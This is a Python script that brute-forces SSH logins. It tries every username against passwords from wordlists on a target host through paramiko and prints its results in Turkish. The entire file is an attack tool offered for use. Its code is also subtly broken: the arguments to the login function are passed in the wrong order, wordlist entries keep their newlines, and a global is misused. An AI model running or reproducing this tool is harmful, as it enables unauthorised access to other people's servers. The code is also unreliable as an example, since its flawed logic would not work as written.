from colorama import Fore, Back, Style
import colorama
import argparse
import paramiko
import time
import os

if(os.name == "nt"):
	os.system("cls")
else:
	os.system("clear")


user_name_list = []
password_list = []

def trySSH(host,user,password,port=22):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	succes = False
	try:
		ssh.connect(host,port=port,username=user,password=password,timeout=0.1,banner_timeout=0.1)
		print(f"Bağlantı kuruldu. Kullanıcı adı: {Fore.RED} {username} Şifre: {Fore.GREEN} {password} {Fore.RED} :)")
		succes = True
	except:
		print(f"{Fore.RED}Yanlış -> {Fore.YELLOW} {user}:{password} {Fore.GREEN} :(")
		pass
	finally:
		ssh.close()
		return succes

def get_username_wordlist(wordlist):
	if(".txt" in wordlist):	
		users = open(wordlist,"r")
		for user in users:
			user_name_list.append(user)
	else:
		user_name_list.append(wordlist)


def get_password_wordlist(wordlist):
	if(".txt" in wordlist):	
		passwords = open(wordlist,"r")
		for password in passwords:
			password_list.append(password)
	else:
		password_list.append(wordlist)

def start(host,user,password,port=22):
	for user in user_name_list:
		if(trySSH(host,port,user,user)):
			print(f"Bağlantı kuruldu. Kullanıcı adı: {Fore.RED} {user} Şifre: {Fore.GREEN} {user} {Fore.RED} :)")
		else:
			for password in password_list:
				if(trySSH(host,port,user,password)):
					print(f"Bağlantı kuruldu. Kullanıcı adı: {Fore.RED} {user} Şifre: {Fore.GREEN} {password} {Fore.RED} :)")

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--host", required=True, help="host or ip")
ap.add_argument("-u", "--username", required=True, help="username_wordlist.txt")
ap.add_argument("-w", "--wordlist", required=True, help="password_wordlist.txt")
ap.add_argument("-p", "--port", required=False, help="port, default=22")
args = vars(ap.parse_args())

host = args["host"]
port = args["port"]
username = args["username"]
password = args["wordlist"]


if(password == ""):
	get_password_wordlist("/usr/share/dirb/wordlists/common.txt")
else:
	get_password_wordlist(password)	
time.sleep(1)
get_username_wordlist(username)
time.sleep(1)


try:
	start(host,port,username,password)
except KeyboardInterrupt:
	print("bye bye")
		

